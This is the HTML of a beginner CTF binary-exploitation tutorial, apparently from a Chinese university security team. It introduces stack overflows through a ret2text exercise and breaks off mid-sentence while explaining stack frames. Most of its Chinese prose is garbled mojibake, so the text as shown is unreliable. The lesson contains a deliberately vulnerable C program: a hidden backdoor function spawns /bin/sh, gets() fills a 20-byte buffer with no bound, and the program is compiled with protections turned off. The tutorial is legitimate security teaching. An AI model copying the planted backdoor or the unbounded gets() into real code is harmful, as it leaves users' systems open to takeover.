    <content type="html"><![CDATA[<h1 id="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"><a href="#Pwnä»å…¥é—¨åˆ°å…¥ç‹±" class="headerlink" title="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"></a>Pwnä»å…¥é—¨åˆ°å…¥ç‹±</h1><p>Copyright Â© 2020 arttnba3,XDSEC</p><h2 id="ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ"><a href="#ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ" class="headerlink" title="ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ"></a>ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ</h2><p><strong>Pwn &#x2F;poÊŠn&#x2F;<strong>è¿™ä¸ªè¯æœ¬èº«å…¶å®æ˜¯ä¸€ä¸ªæ‹Ÿå£°è¯ï¼Œæœ€åˆæ¥æºäºé»‘å®¢ä»¬è®¾æƒ³ä¸­çš„å®Œå…¨è·å–ä¸€å°è®¾å¤‡çš„æ§åˆ¶æƒåä¾¿ä¼šå‘å‡ºâ€œç °â€çš„ä¸€å£°ï¼ŒPwnå› æ­¤è€Œå¾—åï¼Œå³</strong>åˆ©ç”¨æŒ–æ˜åˆ°çš„äºŒè¿›åˆ¶æ¼æ´å¯¹è®¾å¤‡æˆ–ç³»ç»Ÿå‘èµ·æ”»å‡»ï¼Œå¹¶æœ€ç»ˆæ‹¿åˆ°shellï¼ˆè·å–æ§åˆ¶æƒï¼‰</strong></p><p>Pwnä¹Ÿæ˜¯æœ€èƒ½ä»£è¡¨<strong>åŸæ•™æ—¨ä¸»ä¹‰é»‘å®¢</strong>çš„ä¸€ä¸ªå®‰å…¨ç ”ç©¶æ–¹å‘<del>åŒæ—¶ä¹Ÿæ˜¯æœ€å®¹æ˜“è¿›ç›‘ç‹±çš„ä¸€ä¸ªæ–¹å‘</del></p><span id="more"></span><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><p>ä½œä¸ºäºŒè¿›åˆ¶å®‰å…¨çš„åˆ†æ”¯ä¹‹ä¸€ï¼ŒPwnéœ€è¦ä½ <strong>ç†Ÿç»ƒæŒæ¡</strong>å¦‚ä¸‹åŸºç¡€çŸ¥è¯†ï¼š</p><ul><li><strong>ä¸»æµå¹³å°æ±‡ç¼–è¯­è¨€ï¼ŒåŒ…æ‹¬ä½†ä¸å±€é™äºX86ã€MIPSç­‰</strong></li><li><strong>Cè¯­è¨€</strong></li><li><strong>è®¡ç®—æœºç»„æˆåŸç†</strong></li><li><strong>è®¡ç®—æœºæ“ä½œç³»ç»Ÿ</strong></li><li><strong>é™æ€åˆ†æï¼ˆIDAï¼‰&amp;åŠ¨æ€è°ƒè¯•ï¼ˆGDBï¼‰</strong></li><li><strong>Python</strong></li><li><strong>ç¼–è¯‘åŸç†</strong></li><li><strong>â€¦â€¦</strong></li></ul><p>çœ‹å®Œä½ å¯èƒ½ä¼šæ„Ÿè§‰æœ‰ä¸€ä¸¶ä¸¶å¤´å¤§ï¼Œä¸è¿‡å°‘æœ‰äººæ˜¯å…ˆæŠŠè®¡ç§‘ä¸“ä¸šæœ¬ç§‘çš„å†…å®¹å…¨éƒ¨å­¦å®Œæ‰å¼€å§‹å­¦pwnçš„ï¼Œå¤§å®¶éƒ½æ˜¯<strong>ä¸€è¾¹æ¯”èµ›ä¸€è¾¹å­¦ä¹ çš„</strong>ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒå› ä¸ºè‡ªå·±0åŸºç¡€å¯¼è‡´æ— æ³•å…¥é—¨çš„æƒ…å†µçš„å‘ç”Ÿ</p><blockquote><p>CTF TO LEARN, NOT LEARN TO CTF</p></blockquote><h2 id="Pwnçš„è§£é¢˜è¿‡ç¨‹ï¼Ÿ"><a href="#Pwnçš„è§£é¢˜è¿‡ç¨‹ï¼Ÿ" class="headerlink" title="Pwnçš„è§£é¢˜è¿‡ç¨‹ï¼Ÿ"></a>Pwnçš„è§£é¢˜è¿‡ç¨‹ï¼Ÿ</h2><ol><li>é¢˜ç›®çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸€èˆ¬ä¼šè¢«éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼Œä½¿ç”¨<code>nc xx.xx.xx.xx(ip) xxxx(ç«¯å£)</code>å‘½ä»¤å¯ä»¥ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚å¹¶ä¸”è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å‰¯æœ¬ï¼ˆä¸æœåŠ¡å™¨ä¸Šçš„å®Œå…¨ç›¸åŒæˆ–è€…åŸºæœ¬ç›¸åŒï¼‰å°†ä½œä¸ºé™„ä»¶å½¢å¼è¢«æä¾›ç»™é€‰æ‰‹ä¸‹è½½ã€‚</li><li>ä½ éœ€è¦é€†å‘åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶å‰¯æœ¬ä¸­å­˜åœ¨çš„å¯åˆ©ç”¨æ¼æ´ï¼Œé’ˆå¯¹å…¶ç¼–å†™<code>Exploit</code>(æ¼æ´åˆ©ç”¨è„šæœ¬)ï¼Œç„¶åå‘æœåŠ¡å™¨å‘èµ·æ”»å‡»ï¼Œæ‹¿åˆ°æœåŠ¡å™¨ä¸Šä¿å­˜çš„<code>flagæ–‡ä»¶æˆ–å­—ç¬¦ä¸²</code>ï¼Œå°†å…¶æäº¤è‡³æœ¬å¹³å°ã€‚</li><li>æ³¨æ„å‘½ä»¤è¡Œä¸­çš„<code>nc</code>å¹¶ä¸æ˜¯åšé¢˜å·¥å…·ï¼Œä½ éœ€è¦åœ¨Linuxä¸‹å®‰è£…<code>pwntools</code>åº“ï¼ˆæˆ–è€…å…¶å®ƒï¼‰ï¼Œç”¨äºç¼–å†™å¯ç”¨æ€§è¾ƒé«˜çš„<code>Exploit</code>ã€‚è‡³äºå¦‚ä½•å®‰è£…ï¼Œå¦‚ä½•ä½¿ç”¨ï¼Œå°±éœ€è¦èªæ˜çš„ä½ å‘æŒ¥è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›å•¦~</li></ol><h2 id="0åŸºç¡€å…¥é—¨ï¼šæ–°äººçš„ç¬¬ä¸€ä¸ªå®‰å…¨æ¼æ´çš„åˆ©ç”¨â€”â€”æ ˆæº¢å‡ºâ€”â€”ret2text"><a href="#0åŸºç¡€å…¥é—¨ï¼šæ–°äººçš„ç¬¬ä¸€ä¸ªå®‰å…¨æ¼æ´çš„åˆ©ç”¨â€”â€”æ ˆæº¢å‡ºâ€”â€”ret2text" class="headerlink" title="0åŸºç¡€å…¥é—¨ï¼šæ–°äººçš„ç¬¬ä¸€ä¸ªå®‰å…¨æ¼æ´çš„åˆ©ç”¨â€”â€”æ ˆæº¢å‡ºâ€”â€”ret2text"></a>0åŸºç¡€å…¥é—¨ï¼šæ–°äººçš„ç¬¬ä¸€ä¸ªå®‰å…¨æ¼æ´çš„åˆ©ç”¨â€”â€”æ ˆæº¢å‡ºâ€”â€”ret2text</h2><blockquote><h4 id="å‰ç½®çŸ¥è¯†è¦æ±‚ï¼š"><a href="#å‰ç½®çŸ¥è¯†è¦æ±‚ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†è¦æ±‚ï¼š"></a>å‰ç½®çŸ¥è¯†è¦æ±‚ï¼š</h4><ul><li>Cè¯­è¨€åŸºæœ¬è¯­æ³•</li><li>Pythonè¯­è¨€åŸºæœ¬è¯­æ³•</li></ul><p>èƒ½å¤§è‡´çœ‹å¾—æ‡‚Cç¨‹åºã€æœ‰å†™ç®€å•çš„Pythonç¨‹åºçš„èƒ½åŠ›å³å¯</p><h4 id="å‰ç½®ç¯å¢ƒè¦æ±‚ï¼š"><a href="#å‰ç½®ç¯å¢ƒè¦æ±‚ï¼š" class="headerlink" title="å‰ç½®ç¯å¢ƒè¦æ±‚ï¼š"></a>å‰ç½®ç¯å¢ƒè¦æ±‚ï¼š</h4><ul><li><p>Windows</p></li><li><p>Linux</p></li></ul><p>æˆ‘ä»¬çš„ä¸€éƒ¨åˆ†å·¥ä½œéœ€è¦åœ¨Windowsä¸Šå®Œæˆï¼Œå¦ä¸€éƒ¨ä»½å·¥ä½œåˆ™éœ€è¦åœ¨Linuxä¸­å®Œæˆ</p><p>ä½ å¯ä»¥åœ¨windowsä¸Šè¿è¡ŒLinuxè™šæ‹Ÿæœºï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨çœŸæœºè¿è¡Œlinux</p><p>æ³¨ï¼šlinuxç¯å¢ƒä¸‹ç”±äºé»˜è®¤çš„è¿œç¨‹è½¯ä»¶åº“æ˜¯å›½å¤–çš„æºï¼Œä¸‹è½½é€Ÿåº¦å¯èƒ½ä¼šæ¯”è¾ƒæ…¢</p><h4 id="ç™¾åº¦â€œLinux-æ¢æºâ€ä¸â€œpip-æ¢æºâ€æ›´æ¢Linuxä¸‹çš„è½¯ä»¶æºä¸ºå›½å†…çš„è½¯ä»¶æºï¼Œæé«˜ä¸‹è½½é€Ÿåº¦"><a href="#ç™¾åº¦â€œLinux-æ¢æºâ€ä¸â€œpip-æ¢æºâ€æ›´æ¢Linuxä¸‹çš„è½¯ä»¶æºä¸ºå›½å†…çš„è½¯ä»¶æºï¼Œæé«˜ä¸‹è½½é€Ÿåº¦" class="headerlink" title="ç™¾åº¦â€œLinux æ¢æºâ€ä¸â€œpip æ¢æºâ€æ›´æ¢Linuxä¸‹çš„è½¯ä»¶æºä¸ºå›½å†…çš„è½¯ä»¶æºï¼Œæé«˜ä¸‹è½½é€Ÿåº¦"></a>ç™¾åº¦â€œLinux æ¢æºâ€ä¸â€œpip æ¢æºâ€æ›´æ¢Linuxä¸‹çš„è½¯ä»¶æºä¸ºå›½å†…çš„è½¯ä»¶æºï¼Œæé«˜ä¸‹è½½é€Ÿåº¦</h4><h4 id="ä¸åŒçš„Linuxå‘è¡Œç‰ˆæœ¬ï¼ˆå¦‚Ubuntuã€Kaliã€manjaroç­‰ï¼‰è¯·è‡ªè¡Œå°†æœç´¢æ¡†å†…çš„â€œlinuxâ€æ¢ä¸ºå¯¹åº”çš„å‘è¡Œç‰ˆåç§°"><a href="#ä¸åŒçš„Linuxå‘è¡Œç‰ˆæœ¬ï¼ˆå¦‚Ubuntuã€Kaliã€manjaroç­‰ï¼‰è¯·è‡ªè¡Œå°†æœç´¢æ¡†å†…çš„â€œlinuxâ€æ¢ä¸ºå¯¹åº”çš„å‘è¡Œç‰ˆåç§°" class="headerlink" title="ä¸åŒçš„Linuxå‘è¡Œç‰ˆæœ¬ï¼ˆå¦‚Ubuntuã€Kaliã€manjaroç­‰ï¼‰è¯·è‡ªè¡Œå°†æœç´¢æ¡†å†…çš„â€œlinuxâ€æ¢ä¸ºå¯¹åº”çš„å‘è¡Œç‰ˆåç§°"></a>ä¸åŒçš„Linuxå‘è¡Œç‰ˆæœ¬ï¼ˆå¦‚Ubuntuã€Kaliã€manjaroç­‰ï¼‰è¯·è‡ªè¡Œå°†æœç´¢æ¡†å†…çš„â€œlinuxâ€æ¢ä¸ºå¯¹åº”çš„å‘è¡Œç‰ˆåç§°</h4></blockquote><p>ä»¥ä¸‹å†…å®¹å°†é€šè¿‡å‡ ä¸ªæ ·ä¾‹ç®€å•åœ°å¸®åŠ©ä½ å…¥é—¨Pwn</p><h3 id="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š"><a href="#ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š" class="headerlink" title="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š"></a>ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š</h3><p>æˆ‘ä»¬ç°åœ¨æ¥çœ‹è¿™æ ·çš„ä¸€ä¸ªç¨‹åºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tell me your name plz:&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>-fno-stack-protector</code>ã€<code>-z norelro</code>ã€<code>-z execstack</code>ã€<code>-no-pie</code>è¿™å››æ¡ç¼–è¯‘æŒ‡ä»¤æŠŠè¿™ä¸ªç¨‹åºçš„ä¿æŠ¤éƒ½ç»™å…³æ‰</p><p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p><h4 id="å®‰å…¨æ£€æŸ¥ï¼šchecksec"><a href="#å®‰å…¨æ£€æŸ¥ï¼šchecksec" class="headerlink" title="å®‰å…¨æ£€æŸ¥ï¼šchecksec"></a>å®‰å…¨æ£€æŸ¥ï¼šchecksec</h4><p><strong>ä½¿ç”¨<code>checksec</code>æŒ‡ä»¤å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„ä¿æŠ¤å¼€å¯æƒ…å†µ</strong></p><p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p><p>å¯ä»¥åœ¨æ§åˆ¶å°è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install checksec</span></span><br></pre></td></tr></table></figure><h4 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h4><p>è¿™ä¸ªç¨‹åºåšäº†äº›ä»€ä¹ˆï¼Ÿ</p><ul><li><p>å®šä¹‰äº†ä¸€ä¸ªåé—¨å‡½æ•°<code>backdoor()</code>ï¼Œä½†æ˜¯å¹¶æœªè°ƒç”¨</p></li><li><p>åˆ†é…äº†20ä¸ªå­—èŠ‚å¤§å°çš„å†…å­˜ç©ºé—´ç»™åˆ°charç±»å‹æ•°ç»„str</p></li><li><p>ä½¿ç”¨<code>gets()</code>å‡½æ•°ä»æ ‡å‡†è¾“å…¥æµè¯»å…¥å­—ç¬¦ä¸²å¹¶å†™å…¥æ•°ç»„strå†…</p></li></ul><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶ç¼–è¯‘å™¨<strong>ç»™äº†ä¸€ä¸ªè­¦å‘Š</strong>ï¼Œè¿™æ˜¯å› ä¸º<strong>gets()å‡½æ•°å¹¶æœªé™åˆ¶è¯»å…¥çš„å­—ç¬¦çš„æ•°é‡ï¼Œè‹¥æ˜¯ç”¨æˆ·è¾“å…¥è¶…è¿‡20ä¸ªå­—ç¬¦çš„æ•°æ®ï¼Œåˆ™ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼Œè½»åˆ™ä¼šä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯èƒ½è®©ä¸æ³•åˆ†å­è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™</strong></p><p>æˆ‘ä»¬å°è¯•ç€è¾“å…¥è¶…è¿‡20ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿäº›ä»€ä¹ˆï¼š</p><p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p><p>ç¨‹åºå´©æºƒï¼Œæç¤º<strong>Segmentation fault</strong>ï¼ˆ<strong>æ®µé”™è¯¯</strong>ï¼‰ï¼Œå³<strong>è¯¥ç¨‹åºå°è¯•è®¿é—®äº†ä¸å±äºä»–çš„å†…å­˜ç©ºé—´</strong></p><p>ä½†æ˜¯æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œæµç¨‹æ˜æ˜å¾ˆå¸¸è§„ï¼Œä»£ç é‡Œä¹Ÿæ²¡æœ‰ä»»ä½•çš„å¥‡æ€ªçš„æ“ä½œï¼Œ<strong>ä¸ºä»€ä¹ˆè¾“å…¥ä¸ä¸€æ ·å°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒå‘¢ï¼Ÿ</strong></p><h3 id="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºWindowsï¼š"><a href="#ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºWindowsï¼š" class="headerlink" title="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºWindowsï¼š"></a>ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºWindowsï¼š</h3><h4 id="IDAï¼šé€†å‘åˆ†æ"><a href="#IDAï¼šé€†å‘åˆ†æ" class="headerlink" title="IDAï¼šé€†å‘åˆ†æ"></a>IDAï¼šé€†å‘åˆ†æ</h4><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ‰€æ‹¿åˆ°çš„éƒ½æ˜¯è½¯ä»¶çš„å‘è¡Œç‰ˆï¼Œè€Œä¸æ˜¯æºä»£ç ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹å‡ºæ¼æ´å­˜åœ¨äºå“ªä¸ªåœ°æ–¹ï¼Œæ•…æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å°½å¯èƒ½åœ°è¿˜åŸæ•´ä¸ªç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ï¼Œè¿™å°±è¦å€ŸåŠ©åˆ°ä¸€ä¸ªå·¥å…·â€”â€”<strong>IDA</strong></p><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨<strong>IDA</strong>å¯¹ç¨‹åºè¿›è¡Œ<strong>é€†å‘åˆ†æ</strong></p><blockquote><p>æ³¨ï¼šIDAè½¯ä»¶æœ¬ä½“åœ¨moeCTF 2020ç¾¤å†…æœ‰ä¸‹è½½ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©é€šè¿‡æœç´¢å¼•æ“è·å–ä¸€ä¸ªIDAï¼Œæˆ–è€…ç›´æ¥åœ¨å®˜ç½‘è´­ä¹°æ­£ç‰ˆIDA</p></blockquote><p>å½“æˆ‘ä»¬å°†ç¨‹åºæ‹–å…¥IDAåï¼Œé™¤äº†æˆ‘ä»¬è‡ªå·±å†™çš„<code>backdoor()</code>å‡½æ•°ã€<code>func()</code>å‡½æ•°åŠ<code>main()</code>å‡½æ•°ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°IDAè¿˜è§£æå‡ºæ¥å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°ï¼Œ</p><p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p><p>è¿™äº›é¢„æ–™ä¹‹å¤–çš„å‡½æ•°æˆ‘ä»¬ç›®å‰æš‚æ—¶ä¸éœ€è¦ç®¡ï¼ˆä»¥åä¼šå­¦åˆ°çš„ï¼‰ï¼Œæˆ‘ä»¬ç›®å‰åªéœ€è¦åˆ†æç¨‹åºçš„ä¸»é€»è¾‘å‡½æ•°å³å¯ï¼ŒåŒå‡»mainå‡½æ•°ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥çœ‹åˆ°åæ±‡ç¼–å¾—åˆ°çš„æ±‡ç¼–ä»£ç </p><p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p><p>åŒæ ·åœ°ï¼ŒåŒå‡»funcå‡½æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å…¶åŸå§‹çš„æ±‡ç¼–ä»£ç </p><p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p><blockquote><h3 id="F5é”®ï¼šä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†æçš„ç¥å™¨"><a href="#F5é”®ï¼šä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†æçš„ç¥å™¨" class="headerlink" title="F5é”®ï¼šä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†æçš„ç¥å™¨"></a>F5é”®ï¼šä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†æçš„ç¥å™¨</h3><p>å½“æˆ‘ä»¬é€‰ä¸­ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ä¸‹F5é”®ï¼Œå°†æ±‡ç¼–ä»£ç åç¼–è¯‘ä¸ºCè¯­è¨€çš„ä»£ç ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½çš„åˆ†æç¨‹åºæ‰§è¡Œæµç¨‹</p><p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p><p>è¦æ³¨æ„çš„æ˜¯<strong>ä¸è¦å®Œå…¨ä¾èµ–äºF5é”®è¿›è¡Œé€†å‘åˆ†æï¼Œåç¼–è¯‘å‡ºæ¥çš„Cè¯­è¨€ä»£ç ä¸ä¸€å®šå‡†ç¡®ã€æ˜“è¯»ï¼Œæ±‡ç¼–ä»£ç çš„å®¡è®¡ä¸ç¨‹åºçš„åŠ¨æ€è°ƒè¯•åŒæ ·é‡è¦</strong></p><p>å¦‚ï¼šçº¯æ±‡ç¼–ç¼–å†™çš„ç¨‹åºåç¼–è¯‘å‡ºæ¥çš„ä»£ç ä¸çŸ¥æ‰€äº‘çš„æƒ…å†µå¸¸å¸¸å‡ºç°</p><p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p><p>å¦‚ï¼šC++ç¨‹åºå¾ˆå¤šæ—¶å€™é€†å‡ºæ¥å°±æ˜¯ä¸€å¨shitï¼Œæ²¡æœ‰å¼ºå¤§çš„ä»£ç åŠŸåº•ä½ å¾ˆéš¾ææ˜ç™½ç¨‹åºç©¶ç«Ÿåšäº†äº›ä»€ä¹ˆï¼Œå¦‚ä¸‹å›¾ï¼ˆæ³¨é‡Šæ˜¯æˆ‘ä»¥å‰åšè¿™é“é¢˜çš„æ—¶å€™æ‰‹åŠ¨æ‰“ä¸Šçš„ï¼Œå¯èƒ½æœ‰é”™ï¼Œåˆ«æ·±ç©¶Or2ï¼‰</p><p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p></blockquote><p>pushæ˜¯ä»€ä¹ˆï¼Ÿmovæ˜¯ä»€ä¹ˆï¼Ÿretnåˆæ˜¯ä»€ä¹ˆï¼Ÿä»–ä»¬éƒ½åšäº†äº›ä»€ä¹ˆï¼Ÿæˆ–è®¸ç›®å‰å¯¹äºä½ è€Œè¨€è¿™æ˜¯å®Œå…¨é™Œç”Ÿçš„ä¸€äº›ä¸œè¥¿ï¼Œä¸è¿‡éšç€é€æ­¥æ·±å…¥çš„å­¦ä¹ ï¼Œä½ å°†ä¼šé€æ¸äº†è§£åˆ°å…¶å«ä¹‰ä¸ä½œç”¨</p><h3 id="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š-1"><a href="#ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š-1" class="headerlink" title="ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š"></a>ä»¥ä¸‹å†…å®¹æ“ä½œç¯å¢ƒä½äºLinuxï¼š</h3><h4 id="æ ˆå¸§"><a href="#æ ˆå¸§" class="headerlink" title="æ ˆå¸§"></a>æ ˆå¸§</h4><p>ä¸ºä»€ä¹ˆè¿™ä¸ªç¨‹åºçš„æ±‡ç¼–ä»£ç é•¿è¿™ä¸ªæ ·å­ï¼Ÿè¿™å°±æ¶‰åŠåˆ°Cå‡½æ•°è°ƒç”¨çš„ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ¦‚å¿µâ€”â€”<strong>æ ˆå¸§</strong>ï¼ˆ<strong>Stack Frame</strong>ï¼‰</p><blockquote><p>æ¨èé˜…è¯»â€”â€”ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹ç¬¬10ç« </p></blockquote><blockquote><p> åœ¨è®²æ ˆå¸§ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç®€å•åœ°è®²ä¸€è®²ä»€ä¹ˆæ˜¯<strong>æ ˆ</strong></p><p> åœ¨æ•°æ®ç»“æ„ä¸­ï¼Œ<strong>æ ˆ</strong>ï¼ˆ<strong>stack</strong>ï¼‰æ˜¯ä¸€ç§å—é™çº¿æ€§è¡¨ï¼Œåœ¨çº¿æ€§è¡¨ä¸Šæ’å…¥ä¸åˆ é™¤æ•°æ®çš„æ“ä½œéƒ½åªèƒ½åœ¨æ•°æ®è¡¨çš„ä¸€ç«¯â€”â€”æ ˆé¡¶è¿›è¡Œæ“ä½œï¼Œå› æ­¤æ ˆä¹Ÿæ˜¯ä¸€ç§LIFOè¡¨ï¼ˆLast-in-First-outï¼‰</p><p> åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯¹åŠ¨æ€å†…å­˜çš„è§„åˆ’ä¸ä½¿ç”¨æ˜¯ä¸æ•°æ®ç»“æ„ä¸­çš„æ ˆç›¸ä¼¼çš„ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ ˆå†…å­˜â€ï¼Œç”¨ä»¥å­˜å‚¨å‡½æ•°å†…éƒ¨ï¼ˆåŒ…æ‹¬mainå‡½æ•°ï¼‰çš„å±€éƒ¨å˜é‡å’Œæ–¹æ³•è°ƒç”¨å’Œå‡½æ•°å‚æ•°å€¼ï¼›æ ˆå†…å­˜æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…çš„ï¼Œä¸€èˆ¬é€Ÿåº¦è¾ƒå¿«ï¼›å­˜å‚¨åœ°å€æ˜¯è¿ç»­ä¸”å­˜åœ¨æœ‰é™æ ˆå®¹é‡ï¼Œä¼šå‡ºç°æº¢å‡ºç°è±¡ç¨‹åºå¯ä»¥å°†æ•°æ®å‹å…¥æ ˆä¸­ï¼Œä¹Ÿå¯ä»¥å°†æ•°æ®ä»æ ˆé¡¶å¼¹å‡ºã€‚å‹æ ˆæ“ä½œä½¿å¾—æ ˆå¢å¤§ï¼Œè€Œå¼¹å‡ºæ“ä½œä½¿æ ˆå‡å°ã€‚ æ ˆç”¨äºç»´æŠ¤å‡½æ•°è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼Œç¦»å¼€äº†æ ˆå‡½æ•°è°ƒç”¨å°±æ²¡æ³•å®ç°ã€‚</p></blockquote><p>å½“ç¨‹åºæ¯æ¬¡è¿›è¡Œå‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œéƒ½ä¼šåœ¨è°ƒç”¨æ ˆä¸Šç»´æŠ¤ä¸€ä¸ªç‹¬ç«‹çš„<strong>æ ˆå¸§</strong>ï¼Œç”¨ä»¥å‚¨å­˜å±äºè¿™ä¸ªå‡½æ•°çš„æ•°æ®ä¸åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¦‚ä¸‹ä¿¡æ¯ï¼š</p><ul><li><strong>å‡½æ•°çš„è¿”å›åœ°å€å’Œå‚æ•°</strong></li><li><strong>ä¸´æ—¶å˜é‡: åŒ…æ‹¬å‡½æ•°çš„éé™æ€å±€éƒ¨å˜é‡ä»¥åŠç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„å…¶ä»–ä¸´æ—¶å˜é‡</strong></li></ul><p>æƒ³è±¡å¦‚ä¸‹ä¸€ä¸ªç©ºçš„æ 